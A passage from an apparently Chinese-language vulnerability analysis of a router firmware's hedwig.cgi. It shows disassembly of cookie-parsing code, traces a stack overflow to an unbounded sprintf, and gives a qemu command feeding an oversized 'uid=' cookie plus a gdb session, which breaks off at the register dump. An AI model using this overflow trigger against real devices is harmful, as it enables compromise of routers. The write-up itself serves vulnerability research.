            00407d28 21 a0 40 00     _move      s4,v0
            00407d2c 21 88 00 00     clear      s1
            00407d30 3b 00 15 24     li         s5,0x3b
            00407d34 03 00 1e 24     li         s8,0x3
            00407d38 3b 00 00 10     b          LAB_00407e28
            00407d3c 20 00 17 24     _li        s7,0x20
                                 LAB_00407d40                                    XREF[1]:     00407e30(j)  
            00407d40 1b 00 22 12     beq        s1,v0,LAB_00407db0
            00407d44 02 00 22 2a     _slti      v0,s1,0x2
            00407d48 05 00 40 10     beq        v0,zero,LAB_00407d60
            00407d4c 00 00 00 00     _nop
            00407d50 0a 00 20 12     beq        s1,zero,LAB_00407d7c
            00407d54 00 00 00 00     _nop
            00407d58 33 00 00 10     b          LAB_00407e28
            00407d5c 01 00 94 26     _addiu     s4,s4,0x1
                                 LAB_00407d60                                    XREF[1]:     00407d48(j)  
            00407d60 02 00 02 24     li         v0,0x2
            00407d64 1d 00 22 12     beq        s1,v0,LAB_00407ddc
            00407d68 00 00 00 00     _nop
            00407d6c 2d 00 3e 16     bne        s1,s8,LAB_00407e24
            00407d70 42 00 05 3c     _lui       a1,0x42
            00407d74 24 00 00 10     b          LAB_00407e08
            00407d78 21 20 40 02     _move      a0,s2
                                 LAB_00407d7c                                    XREF[1]:     00407d50(j)  
            00407d7c 29 00 17 12     beq        s0,s7,LAB_00407e24
            00407d80 00 00 00 00     _nop
            00407d84 74 81 99 8f     lw         t9,-0x7e8c(gp)=>->sobj_free                      = 0040e6b8
            00407d88 00 00 00 00     nop
            00407d8c 09 f8 20 03     jalr       t9=>sobj_free                                    undefined sobj_free()
            00407d90 21 20 40 02     _move      a0,s2
            00407d94 10 00 bc 8f     lw         gp,local_30(sp)
            00407d98 00 00 00 00     nop
            00407d9c 74 81 99 8f     lw         t9,-0x7e8c(gp)=>->sobj_free                      = 0040e6b8
            00407da0 00 00 00 00     nop
            00407da4 09 f8 20 03     jalr       t9=>sobj_free                                    undefined sobj_free()
            00407da8 21 20 60 02     _move      a0,s3
            00407dac 10 00 bc 8f     lw         gp,local_30(sp)
                                 LAB_00407db0                                    XREF[1]:     00407d40(j)  
            00407db0 4e 00 15 12     beq        s0,s5,LAB_00407eec
            00407db4 3d 00 02 24     _li        v0,0x3d
            00407db8 1a 00 02 12     beq        s0,v0,LAB_00407e24
            00407dbc 02 00 11 24     _li        s1,0x2
            00407dc0 6c 82 99 8f     lw         t9,-0x7d94(gp)=>->sobj_add_char                  = 0040eb08
            00407dc4 21 28 00 02     move       a1,s0
            00407dc8 09 f8 20 03     jalr       t9=>sobj_add_char                                undefined sobj_add_char()
            00407dcc 21 20 40 02     _move      a0,s2
            00407dd0 10 00 bc 8f     lw         gp,local_30(sp)
            00407dd4 13 00 00 10     b          LAB_00407e24
            00407dd8 01 00 11 24     _li        s1,0x1
                                 LAB_00407ddc                                    XREF[1]:     00407d64(j)  
            00407ddc 03 00 15 16     bne        s0,s5,LAB_00407dec
            00407de0 21 28 00 02     _move      a1,s0
            00407de4 0f 00 00 10     b          LAB_00407e24
            00407de8 03 00 11 24     _li        s1,0x3
                                 LAB_00407dec                                    XREF[1]:     00407ddc(j)  
            00407dec 6c 82 99 8f     lw         t9,-0x7d94(gp)=>->sobj_add_char                  = 0040eb08
            00407df0 00 00 00 00     nop
            00407df4 09 f8 20 03     jalr       t9=>sobj_add_char                                undefined sobj_add_char()
            00407df8 21 20 60 02     _move      a0,s3
            00407dfc 10 00 bc 8f     lw         gp,local_30(sp)
            00407e00 09 00 00 10     b          LAB_00407e28
            00407e04 01 00 94 26     _addiu     s4,s4,0x1
                                 LAB_00407e08                                    XREF[1]:     00407d74(j)  
            00407e08 6c 81 99 8f     lw         t9,-0x7e94(gp)=>->sobj_strcmp                    = 0040e4b0
            00407e0c 00 00 00 00     nop
            00407e10 09 f8 20 03     jalr       t9=>sobj_strcmp                                  undefined sobj_strcmp()
            00407e14 d8 a5 a5 24     _addiu     a1=>DAT_0041a5d8,a1,-0x5a28                      = 75h    u
            00407e18 10 00 bc 8f     lw         gp,local_30(sp)
            00407e1c 08 00 40 10     beq        v0,zero,LAB_00407e40
            00407e20 21 88 00 00     _clear     s1
                                 LAB_00407e24                                    XREF[6]:     00407d6c(j), 00407d7c(j), 
                                                                                              00407db8(j), 00407dd4(j), 
                                                                                              00407de4(j), 00407eec(j)  
            00407e24 01 00 94 26     addiu      s4,s4,0x1
                                 LAB_00407e28                                    XREF[3]:     00407d38(j), 00407d58(j), 
                                                                                              00407e00(j)  
            00407e28 00 00 90 82     lb         s0,0x0(s4)
            00407e2c 00 00 00 00     nop
            00407e30 c3 ff 00 16     bne        s0,zero,LAB_00407d40
            00407e34 01 00 02 24     _li        v0,0x1
            00407e38 22 00 00 10     b          LAB_00407ec4
            00407e3c 42 00 05 3c     _lui       a1,0x42
                                 LAB_00407e40                                    XREF[2]:     00407e1c(j), 00407ed8(j)  
            00407e40 9c 82 99 8f     lw         t9,-0x7d64(gp)=>->sobj_get_string                = 0040e1cc
            00407e44 21 20 60 02     move       a0,s3
                                 LAB_00407e48                                    XREF[1]:     00407ee4(j)  
            00407e48 09 f8 20 03     jalr       t9=>getenv                                       undefined sobj_get_string()
                                                                                                 char * getenv(char * __name)
            00407e4c 00 00 00 00     _nop
            00407e50 10 00 bc 8f     lw         gp,local_30(sp)
            00407e54 21 20 c0 02     move       a0,s6
            00407e58 78 80 99 8f     lw         t9,-0x7f88(gp)=>->sobj_add_string                = 0040e8f0
            00407e5c 00 00 00 00     nop
            00407e60 09 f8 20 03     jalr       t9=>sobj_add_string                              undefined sobj_add_string()
            00407e64 21 28 40 00     _move      a1,v0
            00407e68 10 00 bc 8f     lw         gp,local_30(sp)
            00407e6c 06 00 40 12     beq        s2,zero,LAB_00407e88
            00407e70 00 00 00 00     _nop
            00407e74 0c 83 99 8f     lw         t9,-0x7cf4(gp)=>->sobj_del                       = 0040e724
            00407e78 00 00 00 00     nop
            00407e7c 09 f8 20 03     jalr       t9=>sobj_del                                     undefined sobj_del()
            00407e80 21 20 40 02     _move      a0,s2
            00407e84 10 00 bc 8f     lw         gp,local_30(sp)
                                 LAB_00407e88                                    XREF[1]:     00407e6c(j)  
            00407e88 1a 00 60 12     beq        s3,zero,LAB_00407ef4
            00407e8c 21 20 60 02     _move      a0,s3
            00407e90 0c 83 99 8f     lw         t9,-0x7cf4(gp)=>->sobj_del                       = 0040e724
            00407e94 3c 00 bf 8f     lw         ra,local_4(sp)
            00407e98 38 00 be 8f     lw         s8,local_8(sp)
            00407e9c 34 00 b7 8f     lw         s7,local_c(sp)
            00407ea0 30 00 b6 8f     lw         s6,local_10(sp)
            00407ea4 2c 00 b5 8f     lw         s5,local_14(sp)
            00407ea8 28 00 b4 8f     lw         s4,local_18(sp)
            00407eac 24 00 b3 8f     lw         s3,local_1c(sp)
            00407eb0 20 00 b2 8f     lw         s2,local_20(sp)
            00407eb4 1c 00 b1 8f     lw         s1,local_24(sp)
            00407eb8 18 00 b0 8f     lw         s0,local_28(sp)
            00407ebc 08 00 20 03     jr         t9=>sobj_del
            00407ec0 40 00 bd 27     _addiu     sp,sp,0x40
                                 LAB_00407ec4                                    XREF[1]:     00407e38(j)  
            00407ec4 6c 81 99 8f     lw         t9,-0x7e94(gp)=>->sobj_strcmp                    = 0040e4b0
            00407ec8 d8 a5 a5 24     addiu      a1=>DAT_0041a5d8,a1,-0x5a28                      = 75h    u
            00407ecc 09 f8 20 03     jalr       t9=>sobj_strcmp                                  undefined sobj_strcmp()
            00407ed0 21 20 40 02     _move      a0,s2
            00407ed4 10 00 bc 8f     lw         gp,local_30(sp)
            00407ed8 d9 ff 40 10     beq        v0,zero,LAB_00407e40
            00407edc 42 00 04 3c     _lui       a0,0x42
                                 LAB_00407ee0                                    XREF[3]:     00407d14(j), 00407d1c(j), 
                                                                                              00407d24(j)  
            00407ee0 dc 82 99 8f     lw         t9,-0x7d24(gp)=>->getenv                         = 004194b0
            00407ee4 d8 ff 00 10     b          LAB_00407e48
            00407ee8 dc a5 84 24     _addiu     a0=>s_REMOTE_ADDR_0041a5dc,a0,-0x5a24            = "REMOTE_ADDR"
                                 LAB_00407eec                                    XREF[1]:     00407db0(j)  
            00407eec cd ff 00 10     b          LAB_00407e24
            00407ef0 21 88 00 00     _clear     s1
                                 LAB_00407ef4                                    XREF[1]:     00407e88(j)  
            00407ef4 3c 00 bf 8f     lw         ra,local_4(sp)
            00407ef8 38 00 be 8f     lw         s8,local_8(sp)
            00407efc 34 00 b7 8f     lw         s7,local_c(sp)
            00407f00 30 00 b6 8f     lw         s6,local_10(sp)
            00407f04 2c 00 b5 8f     lw         s5,local_14(sp)
            00407f08 28 00 b4 8f     lw         s4,local_18(sp)
            00407f0c 24 00 b3 8f     lw         s3,local_1c(sp)
            00407f10 20 00 b2 8f     lw         s2,local_20(sp)
            00407f14 1c 00 b1 8f     lw         s1,local_24(sp)
            00407f18 18 00 b0 8f     lw         s0,local_28(sp)
            00407f1c 08 00 e0 03     jr         ra
            00407f20 40 00 bd 27     _addiu     sp,sp,0x40
分析过程中并未发现漏洞出现在哪里,随即查看下哪些函数调用了这个函数,终于在hedwigcgi_main函数中发现了可能会导致栈溢出的危险函数sprintf,这部分的代码如下:
    0040963c 42 00 02 3c     _lui       v0,0x42
            00409640 44 80 99 8f     lw         t9,-0x7fbc(gp)=>->sess_get_uid                   = 00407c98
            00409644 00 00 00 00     nop
            00409648 09 f8 20 03     jalr       t9=>sess_get_uid                                 undefined sess_get_uid()
            0040964c 21 20 a0 02     _move      a0,s5
            00409650 10 00 bc 8f     lw         gp,local_4d8(sp)
            00409654 00 00 00 00     nop
            00409658 9c 82 99 8f     lw         t9,-0x7d64(gp)=>->sobj_get_string                = 0040e1cc
            0040965c 00 00 00 00     nop
            00409660 09 f8 20 03     jalr       t9=>sobj_get_string                              undefined sobj_get_string()
            00409664 21 20 a0 02     _move      a0,s5
            00409668 10 00 bc 8f     lw         gp,local_4d8(sp)
            0040966c 42 00 05 3c     lui        a1,0x42
            00409670 d0 80 99 8f     lw         t9,-0x7f30(gp)=>->sprintf                        = 004197f0
            00409674 21 38 40 00     move       a3,v0
            00409678 21 30 40 02     move       a2=>s_/runtime/session_0041a5b8,s2               = "/runtime/session"
            0040967c 60 a8 a5 24     addiu      a1=>s_%s/%s/postxml_0041a860,a1,-0x57a0          = "%s/%s/postxml"
            00409680 09 f8 20 03     jalr       t9=>sprintf                                      int sprintf(char * __s, char * _
推测可能就是因为sprintf函数导致最终的栈溢出,下面我们对猜测进行验证
    sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=20 -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=`python -c "print 'uid=123'+'A'*0x600"` -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="0.0.0.0" -g 23946 ./htdocs/web/hedwig.cgi
然后我们还是用gdb attach上
    pwndbg> target remote localhost:23946
    Remote debugging using localhost:23946
    0x767e9a00 in ?? ()
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
     V0   0x0
     V1   0x0
     A0   0x0
     A1   0x0
     A2   0x0